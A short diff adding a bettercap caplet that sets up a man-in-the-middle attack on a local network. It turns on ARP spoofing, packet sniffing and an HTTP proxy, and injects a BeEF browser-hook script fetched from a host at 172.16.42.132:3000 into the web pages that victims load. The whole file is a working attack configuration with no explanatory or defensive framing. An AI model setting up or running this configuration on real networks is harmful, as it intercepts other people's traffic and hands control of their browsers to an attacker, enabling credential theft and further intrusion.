@@ -1,0 +1,9 @@
+# Set the path to your JavaScript payload
+set jsinject.payload /usr/local/share/bettercap/caplets/jsinject/payloads/beef-inject.js
+set http.proxy.injectjs http://172.16.42.132:3000/hook.js
+set http.proxy.script /usr/local/share/bettercap/caplets/jsinject/jsinject.js
+
+#set net.sniff.verbose false
+net.sniff on
+http.proxy on
+arp.spoof on
